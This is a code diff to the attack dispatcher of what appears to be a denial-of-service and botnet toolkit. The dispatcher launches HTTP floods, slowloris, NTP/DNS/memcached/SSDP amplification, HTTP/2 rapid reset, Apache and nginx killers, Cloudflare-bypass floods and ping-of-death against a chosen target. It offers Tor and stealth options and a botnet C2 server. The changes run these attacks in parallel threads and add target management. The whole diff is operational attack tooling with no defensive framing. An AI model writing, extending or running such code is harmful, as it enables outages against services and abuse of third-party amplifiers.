@@ -13,6 +13,7 @@ from src.attacks import (
     payload_lab, identity_cloak, cve_explorer, web_exposure_sniper,
     icmp_flood, ping_of_death, quic_flood, mixed_flood, slowpost_attack
 )
+from src.utils.targets import target_mgmt
 from src.core.c2 import BotnetC2
 from src.core.menu import Menu
 
@@ -41,6 +42,10 @@ class AttackDispatcher:
             threading.Thread(target=c2.start_server, daemon=True).start()
             return c2
 
+        if choice == "0":
+            target_mgmt()
+            return
+
         if choice == "18":
             from src.bot import FullBot
             c2_host = params.get("c2_host") or params.get("target") or "127.0.0.1"
@@ -57,16 +62,23 @@ class AttackDispatcher:
         proxies = params["proxies"]
         max_requests = params.get("max_requests", 0)
 
+        # Helper to format URL with port if needed
+        def get_formatted_url(target, port, scheme="http"):
+            if target.startswith("http"): return target
+            if port and ((scheme == "http" and port != 80) or (scheme == "https" and port != 443)):
+                return f"{scheme}://{target}:{port}"
+            return f"{scheme}://{target}"
+
         add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
         
         if choice == "1":
-            url = target if target.startswith("http") else f"http://{target}"
+            url = get_formatted_url(target, port, "http")
             for _ in range(threads):
                 increment_thread_counter()
                 threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()
 
         elif choice == "2":
-            url = target if target.startswith("http") else f"https://{target}"
+            url = get_formatted_url(target, port, "https")
             asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)))
 
         elif choice == "3":
@@ -80,43 +92,54 @@ class AttackDispatcher:
                 threading.Thread(target=udp_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()
 
         elif choice == "5":
-            slowloris_attack(target, port, duration, threads)
+            increment_thread_counter()
+            threading.Thread(target=slowloris_attack, args=(target, port, duration, threads), daemon=True).start()
 
         elif choice == "6":
-            ntp_amplification(target, duration, monitor)
+            increment_thread_counter()
+            threading.Thread(target=ntp_amplification, args=(target, duration, monitor), daemon=True).start()
 
         elif choice == "8":
-            url = target if target.startswith("http") else f"https://{target}"
-            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False))
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=cloudflare_bypass_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()
 
         elif choice == "9":
-            memcached_amplification(target, duration, monitor)
+            increment_thread_counter()
+            threading.Thread(target=memcached_amplification, args=(target, duration, monitor), daemon=True).start()
 
         elif choice == "10":
-            ssdp_amplification(target, duration, monitor)
+            increment_thread_counter()
+            threading.Thread(target=ssdp_amplification, args=(target, duration, monitor), daemon=True).start()
 
         elif choice == "11":
-            dns_amplification(target, duration, monitor)
+            increment_thread_counter()
+            threading.Thread(target=dns_amplification, args=(target, duration, monitor), daemon=True).start()
 
         elif choice == "12":
-            url = target if target.startswith("http") else f"http://{target}"
-            rudy_attack(url, duration, threads, monitor)
+            url = get_formatted_url(target, port, "http")
+            increment_thread_counter()
+            threading.Thread(target=rudy_attack, args=(url, duration, threads, monitor), daemon=True).start()
 
         elif choice == "13":
-            url = target if target.startswith("http") else f"https://{target}"
-            hoic_attack(url, duration, monitor)
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=hoic_attack, args=(url, duration, monitor), daemon=True).start()
 
         elif choice == "14":
-            url = target if target.startswith("http") else f"https://{target}"
-            http2_rapid_reset(url, duration, monitor)
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=http2_rapid_reset, args=(url, duration, monitor), daemon=True).start()
 
         elif choice == "15":
-            url = target if target.startswith("http") else f"https://{target}"
-            apache_killer(url, duration, monitor)
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=apache_killer, args=(url, duration, monitor), daemon=True).start()
 
         elif choice == "16":
-            url = target if target.startswith("http") else f"https://{target}"
-            nginx_range_dos(url, duration, monitor)
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=nginx_range_dos, args=(url, duration, monitor), daemon=True).start()
 
         elif choice == "17":
             ports = params.get("ports") or params.get("port") or "1-1024"
@@ -125,6 +148,7 @@ class AttackDispatcher:
 
         elif choice == "19":
             # Hybrid ICMP attack: Run both in parallel
+            increment_thread_counter()
             threading.Thread(target=ping_of_death, args=(target, duration, monitor), daemon=True).start()
             for _ in range(threads):
                 increment_thread_counter()
@@ -137,11 +161,12 @@ class AttackDispatcher:
             ip_tracker(target if "." in target else None)
 
         elif choice == "22":
-            url = target if target.startswith("http") else f"https://{target}"
-            adaptive_flood(url, duration, proxies, monitor)
+            url = get_formatted_url(target, port, "https")
+            increment_thread_counter()
+            threading.Thread(target=adaptive_flood, args=(url, duration, proxies, monitor), daemon=True).start()
 
         elif choice == "23":
-            url = target if target.startswith("http") else f"http://{target}"
+            url = get_formatted_url(target, port, "http")
             vulnerability_scout(url)
 
         elif choice == "24":
@@ -169,17 +194,17 @@ class AttackDispatcher:
             cve_explorer(params.get("keyword", target))
 
         elif choice == "32":
-            url = target if target.startswith("http") else f"http://{target}"
+            url = get_formatted_url(target, port, "http")
             web_exposure_sniper(url)
 
         elif choice == "33":
-            url = target if target.startswith("http") else f"http://{target}"
+            url = get_formatted_url(target, port, "http")
             for _ in range(threads):
                 increment_thread_counter()
                 threading.Thread(target=mixed_flood, args=(url, duration, proxies, monitor), daemon=True).start()
 
         elif choice == "34":
-            url = target if target.startswith("http") else f"http://{target}"
+            url = get_formatted_url(target, port, "http")
             slowpost_attack(url, duration, monitor)
 
         elif choice == "35":
